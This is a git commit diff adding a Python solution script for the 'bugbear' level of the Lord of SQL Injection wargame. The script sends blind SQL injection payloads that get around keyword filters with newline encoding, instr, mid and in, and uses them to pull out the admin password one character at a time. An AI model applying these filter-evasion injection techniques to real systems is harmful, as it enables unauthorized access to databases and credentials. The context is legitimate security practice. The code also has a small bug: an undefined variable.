15bdfd76476874ebcd5b9ef177f4f7aa384e06dd
Jeong Min Kim <dsaqaz421@naver.com>
2022-09-06 03:47:16 +0000

    Test: bugbear test code

--- Lord-Of-Sqlinjection/013bugbear.py
+++ Lord-Of-Sqlinjection/013bugbear.py
@@ -18,10 +18,45 @@
   highlight_file(__FILE__); 
 ?>
 '''
+# ascii 우회 -> ord 사용
+# =, like 우회 -> instr 또는 < , > 사용
+
+from re import I
 import requests
 from urllib import parse
 
 host = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?"
 cookies = {"PHPSESSID" : "8s7khiq67rue3qlsffsskni093"}
-password_length = 0
+
 s = requests.Session()
+
+def main() :  
+  password_length = find_password_length()
+  password_inject(password_length)
+
+def find_password_length() : # 패스워드 길이 찾기
+  print("password length find start!!")
+  for i in range(1, 50) :          
+    param = f"pw=&no=0%0a||%0ainstr(id,\"admin\")%0a%26%26%0alength(pw)>{i}"
+    res = s.get(host + (param), cookies=cookies)
+    if "Hello admin" not in res.text :
+      print(f"password length is {i}")
+      print("password length find end !!")
+      return i
+
+def password_inject(password_length) :  
+  print("password inject start !! ")
+  for i in range(1, password_length + 1) :
+    for j in range(47, 123) : # 48~57 0~9 / 65 ~90 A-Z 97~122 a-z    
+      print(chr(j))
+      param = f"pw=&no=0%0a||%0ainstr(id,\"admin\")%0a%26%26%0amid(pw,{i},{i+1})%0ain%0a(\"{chr(j)}\")"
+      res = s.get(host + param, cookies=cookies)
+      if "No Hack ~_~" in res.text :
+        print("filtering...")        
+      if "Hello admin" in res.text :
+        origin_pwd += chr(j)
+        print("findit...!" + origin_pwd)
+        break
+
+if __name__ == "__main__":
+  main()
